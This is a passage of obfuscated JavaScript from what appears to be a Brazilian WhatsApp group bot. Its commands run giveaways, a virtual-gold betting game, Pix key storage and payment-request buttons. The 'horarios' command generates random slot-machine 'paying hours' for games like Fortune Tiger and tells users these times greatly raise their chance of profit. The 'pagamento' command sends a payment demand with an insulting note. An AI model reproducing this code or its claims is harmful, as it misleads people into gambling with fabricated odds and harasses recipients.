                      key: _0x457f1e
                    } = await _0x5196be.sendMessage(_0x346d97, {
                      'text': "*🎉 Sorteio Iniciado 🎉*\n\n*Prêmio(s):* " + _0xe8cdc3 + "\n*Finaliza em:* " + _0x276eac + "\n*Quantidade de Ganhadores:* " + _0x6cb76b + "\n\n*⚠️ Reaja A Esta Msg Para Participar ⚠️*",
                      'mentions': groupMembers.map(_0x36a56b => _0x36a56b.id)
                    });
                    const _0x383ba6 = {
                      idMensagem: _0x457f1e.id,
                      premio: _0xe8cdc3,
                      duracao: _0x5758b5,
                      quantidadeGanhadores: _0x6cb76b,
                      participantes: []
                    };
                    if (!_0x3f76d4.grupos) {
                      _0x3f76d4.grupos = {};
                    }
                    _0x3f76d4.grupos[_0x346d97] = _0x383ba6;
                    fs.writeFileSync("./DADOS/json/sortreact.json", JSON.stringify(_0x3f76d4, null, 2));
                  } catch (_0x20e31c) {
                    console.error("Erro ao criar sorteio:", _0x20e31c);
                  }
                }
                _0x177650();
              }
              break;
            case "cancelsortreact":
            case "cancelar-sortreact":
            case "sortreact-cancelar":
              {
                async function _0xd3de7() {
                  const _0x472c42 = {
                    grupos: {}
                  };
                  let _0x2315db = _0x472c42;
                  try {
                    let _0x46e279 = fs.readFileSync("./DADOS/json/sortreact.json", "utf8");
                    _0x2315db = JSON.parse(_0x46e279);
                  } catch (_0x45e306) {
                    console.warn("Não foi possível ler o arquivo existente. Um novo será criado: " + _0x45e306.message);
                  }
                  if (!_0x2315db.grupos || !_0x2315db.grupos[_0x346d97]) {
                    return _0x50740b("Não há nenhum sorteio ativo neste grupo.");
                  }
                  delete _0x2315db.grupos[_0x346d97];
                  fs.writeFileSync("./DADOS/json/sortreact.json", JSON.stringify(_0x2315db, null, 2));
                  try {
                    const _0x17f02c = {
                      text: "*🎉 Sorteio Cancelado 🎉*\n\nO sorteio ativo foi cancelado."
                    };
                    await _0x5196be.sendMessage(_0x346d97, _0x17f02c);
                  } catch (_0x56fae4) {
                    console.error("Erro ao enviar mensagem de cancelamento:", _0x56fae4);
                  }
                }
                _0xd3de7();
              }
              break;
            case "testere":
              {
                async function _0x1a31f2() {
                  const _0x5c1968 = {
                    text: "teste....."
                  };
                  let {
                    key: _0x3ec20e
                  } = await _0x5196be.sendMessage(_0x346d97, _0x5c1968);
                  console.log("Resposta recebida:", _0x3ec20e.id);
                }
                _0x1a31f2();
              }
              break;
            case "testemg":
              {
                const _0xe3f7f6 = {
                  groupJid: "120363161500776365@g.us",
                  groupSubject: "teste"
                };
                const _0x52bc12 = {
                  groupMentions: [_0xe3f7f6]
                };
                const _0x319ed2 = {
                  text: "group mention @120363161500776365@g.us",
                  contextInfo: _0x52bc12
                };
                _0x5196be.sendMessage(_0x346d97, _0x319ed2);
              }
              break;
            case "doublegold":
            case "doubleg":
              {
                let [_0xfa1a1, _0x1b4945] = _0x23d865;
                if (!_0xfa1a1 || !_0x1b4945) {
                  return _0x50740b("Você deve informar a cor e o valor da aposta,\nInforme uma das seguintes cores: Vermelho / Preto / Branco\nexemplo: " + (_0x141936 + _0x267d4b) + " vermelho 50");
                }
                let _0x5a3bdf = _0x3de59a.RS(_0x246d48, "Golds");
                let _0x55e5fa = Number(_0x1b4945);
                if (isNaN(_0x55e5fa) || _0x55e5fa <= 0 || _0x55e5fa > 50) {
                  return _0x50740b("Informe um valor de aposta válido entre 1 e 50.");
                }
                if (_0x5a3bdf < _0x55e5fa) {
                  return _0x50740b("Você não tem gold suficiente para jogar.");
                }
                if (!["vermelho", "preto", "branco"].includes(_0xfa1a1.toLowerCase())) {
                  return _0x50740b("Informe uma das seguintes cores: Vermelho / Preto / Branco");
                }
                if (_0x55e5fa > 100) {
                  return _0x50740b("limite maximo de aposta: 100");
                }
                let _0x64b3af = _0x326cbd[0].Chances.findIndex(_0x16f311 => _0x16f311.id === _0x246d48);
                if (_0x64b3af !== -1) {
                  if (_0x326cbd[0].Chances[_0x64b3af].doubleg === null || _0x326cbd[0].Chances[_0x64b3af].doubleg === undefined) {
                    _0x326cbd[0].Chances[_0x64b3af].doubleg = 1;
                  } else {
                    if (_0x326cbd[0].Chances[_0x64b3af].doubleg >= 5) {
                      return _0x50740b("*Você já jogou as 5 vezes de hoje.*");
                    } else {
                      _0x326cbd[0].Chances[_0x64b3af].doubleg += 1;
                    }
                  }
                } else {
                  const _0x3c8829 = {
                    id: _0x246d48,
                    doubleg: 0x1
                  };
                  _0x326cbd[0].Chances.push(_0x3c8829);
                }
                _0x137e44(_0x326cbd);
                let _0x2c39f0 = ['⚪', '🔴', '⚫'];
                const _0x1d2a96 = {
                  length: 0x7
                };
                let _0x4e7c3c = Array.from(_0x1d2a96, () => {
                  let _0x5ad180 = Math.floor(Math.random() * _0x2c39f0.length);
                  return _0x2c39f0[_0x5ad180];
                });
                simresult = _0x4e7c3c[3];
                _0x4e7c3c[3] = '[' + _0x4e7c3c[3] + ']';
                let _0x101d2b = _0x4e7c3c[3];
                let _0xcc34f9;
                switch (_0x101d2b) {
                  case "[⚪]":
                    _0xcc34f9 = "branco";
                    break;
                  case "[🔴]":
                    _0xcc34f9 = "vermelho";
                    break;
                  case "[⚫]":
                    _0xcc34f9 = "preto";
                    break;
                }
                let _0x2fb6f2;
                let _0x3494f9;
                if (_0xfa1a1.toLowerCase() === _0xcc34f9) {
                  _0x3494f9 = _0x55e5fa * 2;
                  _0x2fb6f2 = "╔┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╗\n║   *" + _0x4e7c3c.join('') + "*    ║\n╚┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╝\n\n*DEU " + simresult + ", Você ganhou " + _0x3494f9 + " golds.*";
                  _0x3de59a.ADD(_0x246d48, _0x3494f9);
                } else {
                  _0x3494f9 = _0x55e5fa;
                  _0x2fb6f2 = "╔┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╗\n║   *" + _0x4e7c3c.join('') + "*    ║\n╚┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╝\n\n*DEU " + simresult + ", Você perdeu " + _0x3494f9 + " golds.*";
                  _0x3de59a.RM(_0x246d48, _0x3494f9);
                }
                _0x50740b('' + _0x2fb6f2);
              }
              break;
            case "pagamento":
              {
                _0x50740b("Mandei no seu pv");
                const _0x33d2c1 = {
                  text: "Clique no botão para fazer o pagamento."
                };
                const _0x1bdc54 = {
                  value: 0x5dc,
                  offset: 0x64
                };
                const _0x106844 = {
                  value: 0x0,
                  offset: 0x64
                };
                const _0x4aa212 = {
                  value: 0x258,
                  offset: 0x64
                };
                const _0x3f162c = {
                  enabled: false,
                  payment_gateway_checkout_enabled: false
                };
                await _0x5196be.relayMessage(_0x246d48, {
                  'interactiveMessage': {
                    'body': _0x33d2c1,
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': "review_and_pay",
                        'buttonParamsJson': JSON.stringify({
                          'currency': "BRL",
                          'payment_configuration': '',
                          'payment_type': '',
                          'transaction_id': '',
                          'total_amount': _0x1bdc54,
                          'reference_id': "4P9M9RVTCKG",
                          'type': "physical-goods",
                          'payment_method': '',
                          'order': {
                            'status': "payment_requested",
                            'description': '',
                            'subtotal': _0x106844,
                            'order_type': "PAYMENT_REQUEST",
                            'items': [{
                              'retailer_id': "custom-item-04cbf1b2-5661-4ef4-b459-43097402071f",
                              'name': "paga ae logo",
                              'amount': _0x4aa212,
                              'quantity': 0x1
                            }]
                          },
                          'payment_settings': [{
                            'type': "pix_static_code",
                            'pix_static_code': {
                              'merchant_name': "Lotus",
                              'key': "botesdeath@gmail.com",
                              'key_type': "EMAIL"
                            }
                          }, {
                            'type': "cards",
                            'cards': _0x3f162c
                          }],
                          'additional_note': "PAGUE O LOTUS LOGO VAGABUNDA",
                          'native_payment_methods': []
                        })
                      }],
                      'messageParamsJson': ''
                    }
                  }
                }, {});
                break;
              }
            case "pix":
              {
                let _0x306575;
                try {
                  _0x306575 = JSON.parse(fs.readFileSync("./DADOS/json/pix.json", "utf8"));
                  if (!_0x306575 || typeof _0x306575 !== "object") {
                    const _0x883ed6 = {
                      groups: {},
                      global: []
                    };
                    _0x306575 = _0x883ed6;
                  }
                } catch (_0x112c9a) {
                  const _0x3eb251 = {
                    groups: {},
                    global: []
                  };
                  _0x306575 = _0x3eb251;
                }
                let _0x593cb2 = _0x23d865[0] ? _0x23d865[0].toLowerCase() : '';
                let _0x4520cf = _0x306575.groups && _0x306575.groups[_0x346d97] ? _0x306575.groups[_0x346d97] : [];
                let _0x5adf97 = _0x306575.global || [];
                if (!_0x593cb2) {
                  let _0x4e44e0 = _0x4520cf.map(_0x4c4c39 => _0x4c4c39.identificacao);
                  let _0x5a9cec = _0x5adf97.map(_0x1e9adf => _0x1e9adf.identificacao);
                  let _0x5d8399 = "Chaves Pix Deste Grupo:\n";
                  _0x5d8399 += _0x4e44e0.length > 0 ? _0x4e44e0.join("\n") : "Nenhuma Chave Pix disponível neste grupo.";
                  _0x5d8399 += "\n\nChaves Pix globais:\n";
                  _0x5d8399 += _0x5a9cec.length > 0 ? _0x5a9cec.join("\n") : '';
                  return _0x50740b(_0x5d8399);
                }
                let _0x2708e2 = _0x4520cf.find(_0x1b202a => _0x1b202a.identificacao.toLowerCase() === _0x593cb2);
                if (_0x2708e2) {
                  const _0x208516 = {
                    value: 0x0,
                    offset: 0x64
                  };
                  const _0x5e702b = {
                    value: 0x0,
                    offset: 0x64
                  };
                  const _0x5802e6 = {
                    value: 0x0,
                    offset: 0x64
                  };
                  const _0x4deb03 = {
                    value: 0x0,
                    offset: 0x64
                  };
                  const _0x29a9b8 = {
                    name: '',
                    amount: _0x5802e6,
                    quantity: 0x0,
                    sale_amount: _0x4deb03
                  };
                  const _0x5efeb5 = {
                    merchant_name: _0x2708e2.Nome,
                    key: _0x2708e2.Chave,
                    key_type: _0x2708e2.Tipo
                  };
                  return _0x5196be.relayMessage(_0x346d97, {
                    'interactiveMessage': {
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "payment_info",
                          'buttonParamsJson': JSON.stringify({
                            'currency': "BRL",
                            'total_amount': _0x208516,
                            'reference_id': "4PGO5ZYERYY",
                            'type': "physical-goods",
                            'order': {
                              'status': "pending",
                              'subtotal': _0x5e702b,
                              'order_type': "ORDER",
                              'items': [_0x29a9b8]
                            },
                            'payment_settings': [{
                              'type': "pix_static_code",
                              'pix_static_code': _0x5efeb5
                            }]
                          })
                        }],
                        'messageParamsJson': ''
                      }
                    }
                  }, {});
                }
                let _0x3ca3fe = _0x5adf97.find(_0x4924d8 => _0x4924d8.identificacao.toLowerCase() === _0x593cb2);
                if (_0x3ca3fe) {
                  const _0x59c657 = {
                    value: 0x0,
                    offset: 0x64
                  };
                  const _0x49b787 = {
                    value: 0x0,
                    offset: 0x64
                  };
                  const _0x29444e = {
                    value: 0x0,
                    offset: 0x64
                  };
                  const _0x2fae36 = {
                    value: 0x0,
                    offset: 0x64
                  };
                  const _0x345ce0 = {
                    name: '',
                    amount: _0x29444e,
                    quantity: 0x0,
                    sale_amount: _0x2fae36
                  };
                  const _0x373985 = {
                    merchant_name: _0x3ca3fe.Nome,
                    key: _0x3ca3fe.Chave,
                    key_type: _0x3ca3fe.Tipo
                  };
                  return _0x5196be.relayMessage(_0x346d97, {
                    'interactiveMessage': {
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "payment_info",
                          'buttonParamsJson': JSON.stringify({
                            'currency': "BRL",
                            'total_amount': _0x59c657,
                            'reference_id': "4PGO5ZYERYY",
                            'type': "physical-goods",
                            'order': {
                              'status': "pending",
                              'subtotal': _0x49b787,
                              'order_type': "ORDER",
                              'items': [_0x345ce0]
                            },
                            'payment_settings': [{
                              'type': "pix_static_code",
                              'pix_static_code': _0x373985
                            }]
                          })
                        }],
                        'messageParamsJson': ''
                      }
                    }
                  }, {});
                }
                _0x50740b("Nenhuma chave Pix encontrada com essa identificação neste grupo ou globalmente.");
              }
              break;
            case "setpix":
              {
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                let [_0x36c475, _0x2c87a2, _0x60a423] = _0x11e99e.split('|').map(_0x5b7ced => _0x5b7ced.trim());
                if (!_0x36c475 || !_0x2c87a2 || !_0x60a423) {
                  return _0x50740b("Identificação, nome ou chave Pix não fornecidos. Exemplo de uso correto:\nIdentificação|Nome|Chave\n\nExemplo:\n" + (_0x141936 + _0x267d4b) + " lotus|Pix Do Lotus|botesdeath@gmail.com");
                }
                _0x60a423 = _0x60a423.replace(/\s/g, '').replace(/-/g, '');
                function _0x50d082(_0x2e7fa8) {
                  let _0x45cade = /^\d{11}$/;
                  let _0x237b99 = /^\d{14}$/;
                  let _0x2e463e = /^(\+55)?\s?\d{2}\s?\d{4,5}-?\d{4}$/;
                  let _0x5445a9 = /^[0-9a-fA-F]{8}[0-9a-fA-F]{4}[0-9a-fA-F]{4}[0-9a-fA-F]{12}$/;
                  let _0x35198e = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                  if (_0x45cade.test(_0x2e7fa8) || /^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(_0x2e7fa8)) {
                    return "CPF";
                  } else {
                    if (_0x237b99.test(_0x2e7fa8) || /^\d{2}\.\d{3}\.\d{3}\/\d{4}-\d{2}$/.test(_0x2e7fa8)) {
                      return "CNPJ";
                    } else {
                      if (_0x2e463e.test(_0x2e7fa8)) {
                        return "PHONE";
                      } else {
                        if (_0x5445a9.test(_0x2e7fa8)) {
                          return "EVP";
                        } else {
                          if (_0x35198e.test(_0x2e7fa8)) {
                            return "EMAIL";
                          } else {
                            return "Tipo desconhecido";
                          }
                        }
                      }
                    }
                  }
                }
                let _0x54bcf6 = _0x50d082(_0x60a423);
                if (_0x54bcf6 === "Tipo desconhecido") {
                  return _0x50740b("Formato de chave Pix incorreto. Exemplos de formatos válidos:\nCPF: 12345678900\nCNPJ: 12345678000199\nTelefone: +5521995400244\nChave Aleatória (UUID): 550e8400-e29b-41d4-a716-446655440000\nE-mail: exemplo@email.com");
                }
                let _0x100f4b;
                try {
                  _0x100f4b = JSON.parse(fs.readFileSync("./DADOS/json/pix.json", "utf8"));
                } catch (_0x1d9ccf) {
                  const _0x457327 = {
                    groups: {},
                    global: []
                  };
                  _0x100f4b = _0x457327;
                }
                if (Array.isArray(_0x100f4b)) {
                  const _0x141260 = {
                    groups: {},
                    global: []
                  };
                  _0x100f4b = _0x141260;
                } else {
                  if (!_0x100f4b.groups) {
                    _0x100f4b.groups = {};
                  }
                }
                if (!_0x100f4b.global || !Array.isArray(_0x100f4b.global)) {
                  _0x100f4b.global = [];
                }
                let _0x3fbbb0 = _0x100f4b.groups[_0x346d97] || [];
                let _0x21fc8e = _0x3fbbb0.find(_0x2706fb => _0x2706fb.identificacao === _0x36c475);
                let _0x2e4077 = _0x3fbbb0.find(_0xb2c9f1 => _0xb2c9f1.sender === _0x246d48);
                if (_0x21fc8e && _0x21fc8e.sender !== _0x246d48) {
                  return _0x50740b("Já existe uma chave Pix com essa identificação neste grupo.");
                }
                if (_0x2e4077) {
                  let _0x4d226b = _0x3fbbb0.find(_0xae0324 => _0xae0324.sender === _0x246d48);
                  if (_0x4d226b) {
                    _0x4d226b.identificacao = _0x36c475;
                    _0x4d226b.Nome = _0x2c87a2;
                    _0x4d226b.Chave = _0x60a423;
                    _0x4d226b.Tipo = _0x54bcf6;
                  } else {
                    return _0x50740b("Você já possui uma chave Pix neste grupo, mas não foi possível atualizar. Tente novamente.");
                  }
                } else {
                  const _0xaf7e0f = {
                    identificacao: _0x36c475,
                    Nome: _0x2c87a2,
                    Chave: _0x60a423,
                    Tipo: _0x54bcf6,
                    sender: _0x246d48
                  };
                  _0x3fbbb0.push(_0xaf7e0f);
                }
                _0x100f4b.groups[_0x346d97] = _0x3fbbb0;
                fs.writeFileSync("./DADOS/json/pix.json", JSON.stringify(_0x100f4b, null, 2));
                _0x50740b("Chave Pix configurada com sucesso para este grupo.");
              }
              break;
            case "delpix":
            case "delpixg":
              {
                let _0x547ee0 = _0x11e99e.trim();
                if (!_0x547ee0) {
                  return _0x50740b("Identificação não fornecida. Exemplo de uso correto:\n" + (_0x141936 + _0x267d4b) + " lotus");
                }
                let _0x5e6045;
                try {
                  _0x5e6045 = JSON.parse(fs.readFileSync("./DADOS/json/pix.json", "utf8"));
                  if (!_0x5e6045 || typeof _0x5e6045 !== "object") {
                    const _0x20a127 = {
                      groups: {},
                      global: []
                    };
                    _0x5e6045 = _0x20a127;
                  }
                } catch (_0x37e588) {
                  const _0x105360 = {
                    groups: {},
                    global: []
                  };
                  _0x5e6045 = _0x105360;
                }
                if (_0x267d4b === "delpix") {
                  if (!_0x3f2f63) {
                    return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                  }
                  if (!_0x5e6045.groups) {
                    _0x5e6045.groups = {};
                  }
                  let _0x3c91b9 = _0x5e6045.groups[_0x346d97] || [];
                  let _0x5bdfbd = _0x3c91b9.findIndex(_0x2e5f31 => _0x2e5f31.identificacao === _0x547ee0 && _0x2e5f31.sender === _0x246d48);
                  if (_0x5bdfbd === -1) {
                    return _0x50740b("Não foi encontrada uma chave Pix com essa identificação associada ao seu número neste grupo.");
                  }
                  _0x3c91b9.splice(_0x5bdfbd, 1);
                  _0x5e6045.groups[_0x346d97] = _0x3c91b9;
                  _0x50740b("Chave Pix removida com sucesso deste grupo.");
                } else {
                  if (_0x267d4b === "delpixg") {
                    if (!_0xf59944) {
                      return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                    }
                    let _0x40ae5c = _0x5e6045.global.findIndex(_0x113c27 => _0x113c27.identificacao === _0x547ee0);
                    if (_0x40ae5c === -1) {
                      return _0x50740b("Não foi encontrada uma chave Pix global com essa identificação.");
                    }
                    _0x5e6045.global.splice(_0x40ae5c, 1);
                    _0x50740b("Chave Pix global removida com sucesso.");
                  }
                }
                fs.writeFileSync("./DADOS/json/pix.json", JSON.stringify(_0x5e6045, null, 2));
              }
              break;
            case "setpixg":
              {
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                let [_0x4c5707, _0x5ef58e, _0x34a652] = _0x11e99e.split('|').map(_0x5c5503 => _0x5c5503.trim());
                if (!_0x4c5707 || !_0x5ef58e || !_0x34a652) {
                  return _0x50740b("Identificação, nome ou chave Pix não fornecidos. Exemplo de uso correto:\nIdentificação|Nome|Chave\n\nExemplo:\n" + (_0x141936 + _0x267d4b) + " lotus|Pix Do Lotus|botesdeath@gmail.com");
                }
                _0x34a652 = _0x34a652.replace(/\s/g, '').replace(/-/g, '');
                function _0x56b42a(_0x337f7e) {
                  let _0x46ae1c = /^\d{11}$/;
                  let _0x5b4bb7 = /^\d{14}$/;
                  let _0x16d95b = /^(\+55)?\s?\d{2}\s?\d{4,5}-?\d{4}$/;
                  let _0x3fda1d = /^[0-9a-fA-F]{8}[0-9a-fA-F]{4}[0-9a-fA-F]{4}[0-9a-fA-F]{12}$/;
                  let _0x559b81 = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                  if (_0x46ae1c.test(_0x337f7e) || /^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(_0x337f7e)) {
                    return "CPF";
                  } else {
                    if (_0x5b4bb7.test(_0x337f7e) || /^\d{2}\.\d{3}\.\d{3}\/\d{4}-\d{2}$/.test(_0x337f7e)) {
                      return "CNPJ";
                    } else {
                      if (_0x16d95b.test(_0x337f7e)) {
                        return "PHONE";
                      } else {
                        if (_0x3fda1d.test(_0x337f7e)) {
                          return "EVP";
                        } else {
                          if (_0x559b81.test(_0x337f7e)) {
                            return "EMAIL";
                          } else {
                            return "Tipo desconhecido";
                          }
                        }
                      }
                    }
                  }
                }
                let _0x35df5f = _0x56b42a(_0x34a652);
                if (_0x35df5f === "Tipo desconhecido") {
                  return _0x50740b("Formato de chave Pix incorreto. Exemplos de formatos válidos:\nCPF: 12345678900\nCNPJ: 12345678000199\nTelefone: +5521995400244\nChave Aleatória (UUID): 550e8400-e29b-41d4-a716-446655440000\nE-mail: exemplo@email.com");
                }
                let _0x399502;
                try {
                  _0x399502 = JSON.parse(fs.readFileSync("./DADOS/json/pix.json", "utf8"));
                  if (!_0x399502 || typeof _0x399502 !== "object") {
                    const _0x557caf = {
                      groups: {},
                      global: []
                    };
                    _0x399502 = _0x557caf;
                  }
                } catch (_0x47e736) {
                  const _0x284298 = {
                    groups: {},
                    global: []
                  };
                  _0x399502 = _0x284298;
                }
                if (!_0x399502.global) {
                  _0x399502.global = [];
                }
                let _0x39d00a = _0x399502.global.find(_0x3912dd => _0x3912dd.identificacao === _0x4c5707);
                if (_0x39d00a) {
                  let _0x578868 = _0x399502.global.find(_0x5b3a8d => _0x5b3a8d.identificacao === _0x4c5707);
                  if (_0x578868) {
                    _0x578868.Nome = _0x5ef58e;
                    _0x578868.Chave = _0x34a652;
                    _0x578868.Tipo = _0x35df5f;
                  } else {
                    return _0x50740b("Não foi possível atualizar a chave Pix globalmente. Tente novamente.");
                  }
                } else {
                  const _0x3742cf = {
                    identificacao: _0x4c5707,
                    Nome: _0x5ef58e,
                    Chave: _0x34a652,
                    Tipo: _0x35df5f
                  };
                  _0x399502.global.push(_0x3742cf);
                }
                fs.writeFileSync("./DADOS/json/pix.json", JSON.stringify(_0x399502, null, 2));
                _0x50740b("Chave Pix global configurada com sucesso.");
              }
              break;
            case "pinterestts":
              {
                try {
                  if (!_0x11e99e.trim()) {
                    return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " naruto");
                  }
                  let _0x740c43 = await reqapi.pinterest(_0x11e99e.trim());
                  const _0x5f4b93 = {
                    type: "quick_reply",
                    texto: _0x2cd689 + " 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 " + _0x2cd689,
                    id: _0x141936 + "menu"
                  };
                  let _0x3dc144 = [_0x5f4b93];
                  _0x842313(_0x346d97, _0x740c43[_0x740c43.length - 1], "*AQUI ESTA SUA IMAGEM.*", _0x3dc144);
                } catch (_0x24c6bc) {
                  console.log(_0x24c6bc);
                  _0x50740b("Erro");
                }
              }
              break;
            case "hrp":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando é apenas para grupos.");
                }
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("Eu não sou um administrador para executar esta ação.");
                }
                let _0x1f76ba = _0x23d865[0];
                if (!_0x1f76ba || !['1h', '2h'].includes(_0x1f76ba)) {
                  return _0x50740b("Você precisa especificar se o intervalo será de 1h ou 2h.");
                }
                var _0x522863;
                try {
                  var _0x419236 = await _0x5196be.profilePictureUrl(_0x346d97, "image");
                  const _0x55a21c = {
                    responseType: "arraybuffer"
                  };
                  var _0x505457 = await axios.get(_0x419236, _0x55a21c);
                  var _0x926ec9 = Buffer.from(_0x505457.data, "binary");
                  var _0x522863 = await upload(_0x926ec9);
                } catch {
                  var _0x522863 = "https://telegra.ph/file/950f34c0eac965e89b841.jpg";
                }
                let _0x44f164 = [];
                try {
                  _0x44f164 = JSON.parse(await fs.readFile("./DADOS/json/hrp.json", "utf-8"));
                } catch (_0x40d74f) {
                  console.error("Erro ao ler o arquivo JSON hrp.json:", _0x40d74f);
                }
                let _0x5a5e6f = _0x1f76ba === '1h' ? 1 : 2;
                let _0x4d8f07 = _0x44f164.findIndex(_0x316e01 => _0x316e01.id === _0x346d97);
                if (_0x4d8f07 === -1) {
                  const _0x3563bb = {
                    id: _0x346d97,
                    situacao: "ativo",
                    horahh: _0x5a5e6f,
                    ppUrlsl: _0x522863
                  };
                  _0x44f164.push(_0x3563bb);
                  _0x4d8f07 = _0x44f164.length - 1;
                } else {
                  if (_0x1f76ba === (_0x44f164[_0x4d8f07].horahh === 1 ? '1h' : '2h')) {
                    _0x44f164[_0x4d8f07].situacao = _0x44f164[_0x4d8f07].situacao === "ativo" ? "inativo" : "ativo";
                  } else {
                    _0x44f164[_0x4d8f07].horahh = _0x5a5e6f;
                    _0x44f164[_0x4d8f07].situacao = "ativo";
                  }
                  _0x44f164[_0x4d8f07].ppUrlsl = _0x522863;
                }
                await fs.writeFile("./DADOS/json/hrp.json", JSON.stringify(_0x44f164, null, 2));
                let _0x3ceba3 = _0x44f164[_0x4d8f07].situacao || "ativo";
                if (_0x3ceba3 === "ativo") {
                  _0x50740b("Status de horário pagante para este grupo atualizado para " + _0x3ceba3 + ". A cada: " + _0x1f76ba + '.');
                } else {
                  _0x50740b("Modo slot desativado com sucesso para este grupo.");
                  return;
                }
                if (_0x3ceba3 === "ativo") {
                  if (!_0x46517b) {
                    _0x326cbd[0].slot = true;
                    _0x137e44(_0x326cbd);
                    _0x50740b("✓ Ativado com sucesso o modo slot no grupo");
                  }
                } else if (_0x46517b) {
                  _0x326cbd[0].slot = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("✓ Modo slot desativado com sucesso no grupo");
                } else {
                  _0x326cbd[0].slot = true;
                  _0x137e44(_0x326cbd);
                  _0x50740b("✓ Ativado com sucesso o modo slot no grupo");
                }
              }
              break;
            case "horarios":
              {
                if (!_0x46517b) {
                  return "Apenas meu dono pode ativar esse cmd";
                }
                let _0x59defa = JSON.parse(fs.readFileSync("./DADOS/json/hrp.json", "utf-8"));
                let _0xab455e = _0x59defa.find(_0x1fd503 => _0x1fd503.id === _0x346d97);
                if (!_0xab455e) {
                  return _0x50740b("Este Grupo Não Esta Registrado No Sistema De Horarios.");
                }
                if (_0xab455e.situacao !== "ativo") {
                  return _0x50740b("Sistema De Horarios Nesse Grupo Dsta Desativado.");
                }
                let _0x54b90a = moment().tz("America/Sao_Paulo").format('HH');
                var _0x4a7854 = _0xab455e ? _0xab455e.ppUrlsl : "https://telegra.ph/file/950f34c0eac965e89b841.jpg";
                const _0x5bb08e = {
                  nome: "FORTUNE TIGER",
                  emoji: '🐯'
                };
                const _0x564790 = {
                  nome: "DRAGON LUCK",
                  emoji: '🐉'
                };
                const _0x2253bc = {
                  nome: "FORTUNE RABBIT",
                  emoji: '🐰'
                };
                const _0x262b71 = {
                  nome: "FORTUNE MOUSE",
                  emoji: '🐭'
                };
                const _0x544855 = {
                  nome: "GANESHA GOLD",
                  emoji: '🐘'
                };
                const _0x2044ef = {
                  nome: "BIKINI",
                  emoji: '👙'
                };
                const _0x1c5862 = {
                  nome: "MUAY THAI",
                  emoji: '🥊'
                };
                const _0x7c0882 = {
                  nome: "CIRCUS",
                  emoji: '🎪'
                };
                const _0x1be71c = {
                  nome: "FORTUNE OX",
                  emoji: '🐂'
                };
                const _0x2e3814 = {
                  nome: "DOUBLE FORTUNE",
                  emoji: '💰'
                };
                const _0x15b0d9 = {
                  nome: "DRAGON TIGER LUCK",
                  emoji: "🐉🐅"
                };
                const _0x35b083 = {
                  nome: "GENIE'S WISHES(GENIO)",
                  emoji: '🧞'
                };
                const _0x57ffef = {
                  nome: "JUNGLE DELIGHT",
                  emoji: "🌳🌲"
                };
                const _0x3910a4 = {
                  nome: "PIGGY GOLD",
                  emoji: '🐷'
                };
                const _0x52c121 = {
                  nome: "MIDAS FORTUNE",
                  emoji: '👑'
                };
                const _0x44551d = {
                  nome: "SUN & MOON",
                  emoji: "🌞🌛"
                };
                const _0x5cdfaf = {
                  nome: "WILD BANDITO",
                  emoji: "🦹‍♂️"
                };
                const _0x2d86f3 = {
                  nome: "PHOENIX RISES",
                  emoji: "🔥🕊️"
                };
                const _0x366611 = {
                  nome: "SUPERMARKET SPREE",
                  emoji: '🛒'
                };
                const _0x541919 = {
                  nome: "CAPTAIN BOUNTY",
                  emoji: "🚢👨‍✈️"
                };
                const _0x4236f1 = {
                  nome: "MISTER HOLLOWEEN",
                  emoji: '🎃'
                };
                const _0x496740 = {
                  nome: "LEPRECHAUN RICHES",
                  emoji: "🍀💰"
                };
                var _0x244080 = [_0x5bb08e, _0x564790, _0x2253bc, _0x262b71, _0x544855, _0x2044ef, _0x1c5862, _0x7c0882, _0x1be71c, _0x2e3814, _0x15b0d9, _0x35b083, _0x57ffef, _0x3910a4, _0x52c121, _0x44551d, _0x5cdfaf, _0x2d86f3, _0x366611, _0x541919, _0x4236f1, _0x496740];
                let _0x2f63eb = '';
                _0x244080.forEach(_0x229362 => {
                  _0x2f63eb += "\n" + _0x229362.emoji + " *" + _0x229362.nome + "*\n";
                  for (let _0xc61260 = 0; _0xc61260 < 5; _0xc61260++) {
                    let _0x4b3c0a = Math.floor(Math.random() * 60);
                    let _0x33d49c = _0x4b3c0a + Math.floor(Math.random() * 6);
                    _0x4b3c0a = _0x4b3c0a > 59 ? 59 : _0x4b3c0a;
                    _0x33d49c = _0x33d49c > 59 ? 59 : _0x33d49c;
                    let _0x2e6afa = _0x54b90a + ':' + _0x4b3c0a.toString().padStart(2, '0');
                    let _0x2eb1be = _0x54b90a + ':' + _0x33d49c.toString().padStart(2, '0');
                    if (_0x2eb1be < _0x2e6afa) {
                      [_0x2e6afa, _0x2eb1be] = [_0x2eb1be, _0x2e6afa];
                    }
                    _0x2f63eb += " " + _0x229362.emoji + " " + _0x2e6afa + " - " + _0x2eb1be + "\n";
                  }
                });
                let _0x3c2f38 = "🍀💰 *HORARIOS PAGANTES  🍀💰*\n\n\n🕒 *Horários a cada hora*\n\n" + _0x2f63eb + "\nDica: alterne entre os giros entre normal e turbo, se vier um Grande Ganho, PARE e espere a próxima brecha!\n\n🔞NÃO INDICADO PARA MENORES🔞\n\nLembrando a todos!\n\nHorários de probabilidades aumentam muito sua chance de lucrar, mas lembrando que não anula a chance de perda, por mais que seja baixa jogue com responsabilidade...";
                const _0x196148 = {
                  url: _0x4a7854
                };
                const _0x2a72d2 = {
                  image: _0x196148,
